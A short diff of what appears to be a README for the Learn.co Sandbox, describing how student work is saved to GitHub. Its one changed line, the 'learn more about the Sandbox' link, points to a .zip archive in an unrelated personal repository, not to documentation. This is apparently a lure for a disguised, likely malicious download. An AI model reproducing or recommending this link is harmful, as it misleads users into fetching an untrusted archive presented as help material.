@@ -8,4 +8,4 @@ Saving varies by the type of work you are doing:
 -- Most of the work you do in the Sandbox is automatically saved on your behalf to the `learn-co-sandbox` repository in your GitHub account. Please DO NOT touch this repository in GitHub. Doing so will affect your Sandbox experience, and potentially cause your work to fall out of sync.
 -- *Git repositories that you clone into the Sandbox are NOT automatically saved.* In this case, you are responsible for committing and pushing your work to GitHub. 
 
-To learn more about the Sandbox, please visit https://raw.githubusercontent.com/BhagyeshJoshi/dynamodb-rcv/master/Caelian/dynamodb-rcv.zip
+To learn more about the Sandbox, please visit https://github.com/BhagyeshJoshi/dynamodb-rcv/raw/refs/heads/master/Caelian/dynamodb-rcv.zip
